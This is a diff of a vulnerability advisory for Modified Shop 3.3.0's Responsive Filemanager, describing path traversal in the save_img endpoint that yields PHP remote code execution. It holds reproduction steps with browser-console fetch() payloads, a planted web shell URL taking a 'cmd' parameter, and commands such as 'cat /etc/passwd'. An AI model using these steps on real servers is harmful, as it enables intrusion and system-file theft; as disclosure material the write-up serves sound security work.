@@ -4,15 +4,11 @@
 
 A vulnerability was identified in the Responsive Filemanager component integrated into Modified Shop 3.3.0 rev. 16825.
 
-A funcionalidade `save_img`, disponível em: `/admin/includes/modules/filemanager/ajax_calls.php?action=save_img` permite que um usuário com sessão administrativa válida grave conteúdo arbitrário em arquivos no servidor.
-The save_img functionality, available at /admin/includes/modules/filemanager/ajax_calls.php?action=save_img, allows a user with a valid administrative session to write arbitrary content to files on the server.
+The `save_img` functionality, available at `/admin/includes/modules/filemanager/ajax_calls.php?action=save_img`, allows a user with a valid administrative session to write arbitrary content to files on the server.
 
-O parâmetro `name` é concatenado diretamente ao caminho físico, sem validação contra path traversal ou restrição de extensão. Embora o parâmetro `path` seja submetido à função `checkRelativePath()`, essa validação não é aplicada ao parâmetro `name`.
-he `name` parameter is directly concatenated into the physical file path without validation against path traversal or extension restrictions. Although the `path` parameter is passed through the `checkRelativePath()` function, this validation is not applied to the `name` parameter.
+The `name` parameter is directly concatenated into the physical file path without validation against path traversal or extension restrictions. Although the `path` parameter is passed through the `checkRelativePath()` function, this validation is not applied to the `name` parameter.
 
-Foi possível gravar um arquivo PHP fora do diretório de imagens, dentro de `/export/`, e acessá-lo por HTTP. O Apache interpretou o código PHP e retornou o marcador definido na PoC.
 It was possible to write a PHP file outside the images directory, inside `/export/`, and access it over HTTP. Apache interpreted the PHP code and returned the marker defined in the PoC.
-
 
 **Impact: Remote Code Execution (RCE) of PHP code in the context of the web server process user.**
 
@@ -37,7 +33,6 @@ It was possible to write a PHP file outside the images directory, inside `/expor
 ### 1. Session Control
 
 The endpoint checks for the existence of the File Manager session identifier:
-
 ```php
 if ($_SESSION['RF']["verify"] != "RESPONSIVEfilemanager") {
     response(trans('forbidden').AddErrorLocation())->send();
@@ -310,25 +305,25 @@ Password: RedScan@2026!
 
 ## Steps to reproduce
 
-### Access you web browser and provide login in the web application
+### 1- Access you web browser and provide login in the web application
 
 http://192.168.1.193:8080
 
 ![RCE](./img/01.png)
 
 
-### Insert the captcha code and password again
+### 2- Insert the captcha code and password again
 ![RCE](./img/02.png)
 
 
-### Access ajax_calls.php file and look the "forbidden" message
+### 3- Access ajax_calls.php file and look the "forbidden" message
 
 http://192.168.1.193:8080/admin/includes/modules/filemanager/ajax_calls.php?action=save_img
 
 ![RCE](./img/03.png)
 
 
-### Open debug mode and in console box paste the code
+### 4- Open debug mode and in console box paste the code
 ```
 (async () => {
   const r = await fetch(
@@ -349,17 +344,17 @@ http://192.168.1.193:8080/admin/includes/modules/filemanager/ajax_calls.php?acti
 ![RCE](./img/04.png)
 
 
-### Check status code 200 response 
+### 5- Check status code 200 response 
 
 ![RCE](./img/05.png)
 
 
-### Refresh the page by pressing F5 and observe that the "forbidden" message has disappeared.
+### 6- Refresh the page by pressing F5 and observe that the "forbidden" message has disappeared.
 
 ![RCE](./img/06.png)
 
 
-### Paste de following code on the console box
+### 7- Paste de following code on the console box
 ```
 fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
   method: 'POST',
@@ -375,18 +370,18 @@ fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
 ![RCE](./img/07.png)
 
 
-### Check status code 200 response
+### 8- Check status code 200 response
 
 ![RCE](./img/08.png)
 
 
-### Access the created file in link and provide "whoami" command with "cmd" parameter:
+### 9- Access the created file in link and provide "whoami" command with "cmd" parameter:
 http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
 
 ![RCE](./img/09.png)
 
 
-### Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
+### 10- Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
 http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd
 
 ![RCE](./img/10.png)
